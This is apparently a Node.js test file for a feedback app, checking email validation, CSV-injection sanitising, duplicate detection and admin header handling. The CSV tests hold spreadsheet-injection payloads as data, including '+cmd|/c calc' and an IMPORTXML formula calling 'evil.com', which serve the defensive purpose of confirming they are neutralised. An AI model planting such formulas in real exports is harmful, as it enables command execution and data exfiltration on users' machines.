import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

describe('IdeaHub Feedback System Core Validations', () => {

  describe('Email Regex Validation (Client & Server parity)', () => {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

    it('should accept valid standard email addresses', () => {
      assert.ok(emailRegex.test('customer@example.com'));
      assert.ok(emailRegex.test('alex.smith+feedback@sub.domain.co.uk'));
      assert.ok(emailRegex.test('sarah.c@external.com'));
    });

    it('should reject email addresses with single-letter TLDs', () => {
      assert.equal(emailRegex.test('user@example.c'), false);
      assert.equal(emailRegex.test('test@domain.x'), false);
    });

    it('should reject invalid or malformed email addresses', () => {
      assert.equal(emailRegex.test('not-an-email'), false);
      assert.equal(emailRegex.test('user@domain'), false);
      assert.equal(emailRegex.test('@example.com'), false);
      assert.equal(emailRegex.test('user space@domain.com'), false);
    });
  });

  describe('CSV Injection Neutralization (CWE-1236)', () => {
    function sanitizeCsvCell(val) {
      if (!val) return '""';
      let str = String(val);
      if (/^[=+\-@\t\r]/.test(str)) {
        str = "'" + str;
      }
      return `"${str.replace(/"/g, '""')}"`;
    }

    it('should prefix dangerous formula triggers with an apostrophe', () => {
      assert.equal(sanitizeCsvCell('=SUM(A1:A10)'), '"\'=SUM(A1:A10)"');
      assert.equal(sanitizeCsvCell('+cmd|/c calc'), '"\'+cmd|/c calc"');
      assert.equal(sanitizeCsvCell('-2+3*4'), '"\'-2+3*4"');
      assert.equal(sanitizeCsvCell('@IMPORTXML("http://evil.com")'), '"\'@IMPORTXML(""http://evil.com"")"');
      assert.equal(sanitizeCsvCell('\tTabInjected'), '"\'\tTabInjected"');
    });

    it('should not alter normal text cells except for standard CSV escaping', () => {
      assert.equal(sanitizeCsvCell('Add Dark Mode'), '"Add Dark Mode"');
      assert.equal(sanitizeCsvCell('Idea with "quotes"'), '"Idea with ""quotes"""');
    });
  });

  describe('Duplicate Detection Algorithm', () => {
    function detectDuplicates(query, existingIdeas) {
      const q = query.trim().toLowerCase();
      if (!q || q.length < 3) return [];
      const words = q.split(/\s+/).filter(w => w.length > 2);
      return existingIdeas.filter(i => {
        const titleLower = i.title.toLowerCase();
        return words.some(w => titleLower.includes(w));
      });
    }

    const mockIdeas = [
      { id: '1', title: 'Add Dark Mode support' },
      { id: '2', title: 'Improve Search Function' },
      { id: '3', title: 'Bug in Checkout Process' },
    ];

    it('should detect potential duplicates when keywords match', () => {
      const matches = detectDuplicates('Dark mode theme', mockIdeas);
      assert.equal(matches.length, 1);
      assert.equal(matches[0].id, '1');
    });

    it('should return empty list when no meaningful words match or query is too short', () => {
      assert.deepEqual(detectDuplicates('ok', mockIdeas), []);
      assert.deepEqual(detectDuplicates('Completely unrelated feature', mockIdeas), []);
    });
  });

  describe('Per-Idea Draft Scoping', () => {
    class DraftManager {
      constructor() {
        this.drafts = new Map();
      }
      get(ideaId) {
        return this.drafts.get(ideaId) || { comment: '', internalNote: '' };
      }
      set(ideaId, partial) {
        const prev = this.get(ideaId);
        this.drafts.set(ideaId, { ...prev, ...partial });
      }
    }

    it('should isolate reply drafts between different ideas', () => {
      const manager = new DraftManager();
      manager.set('idea-1', { comment: 'Draft for idea 1' });
      manager.set('idea-2', { comment: 'Draft for idea 2' });

      assert.equal(manager.get('idea-1').comment, 'Draft for idea 1');
      assert.equal(manager.get('idea-2').comment, 'Draft for idea 2');
    });
  });

  describe('Admin Credential Header Protection (CWE-798)', () => {
    function computeHeaders(role, adminApiKey) {
      const headers = {
        'Content-Type': 'application/json',
        'X-Voter-Key': 'customer@example.com'
      };
      if (role === 'team' || role === 'admin') {
        headers['X-User-Role'] = role;
        if (adminApiKey) {
          headers['X-Admin-Key'] = adminApiKey;
        }
      }
      return headers;
    }

    it('should never send an X-Admin-Key header when adminApiKey is unset', () => {
      const headers = computeHeaders('admin', '');
      assert.equal(headers['X-Admin-Key'], undefined);
      assert.equal(Object.keys(headers).includes('X-Admin-Key'), false);
    });

    it('should send X-Admin-Key only when explicitly configured', () => {
      const headers = computeHeaders('admin', 'custom-secret-key-123');
      assert.equal(headers['X-Admin-Key'], 'custom-secret-key-123');
    });
  });

  describe('Submission Idempotency Reconciler', () => {
    it('should reconcile pending submissions only by matching exact ID', () => {
      const pendingSubmissions = new Map([
        ['temp-uuid-1', { id: 'temp-uuid-1', title: 'Duplicate title' }],
        ['temp-uuid-2', { id: 'temp-uuid-2', title: 'Duplicate title' }]
      ]);

      const backendItems = [
        { id: 'temp-uuid-1', title: 'Duplicate title' }
      ];

      for (const item of backendItems) {
        if (pendingSubmissions.has(item.id)) {
          pendingSubmissions.delete(item.id);
        }
      }

      assert.equal(pendingSubmissions.has('temp-uuid-1'), false);
      assert.equal(pendingSubmissions.has('temp-uuid-2'), true);
      assert.equal(pendingSubmissions.size, 1);
    });
  });
});
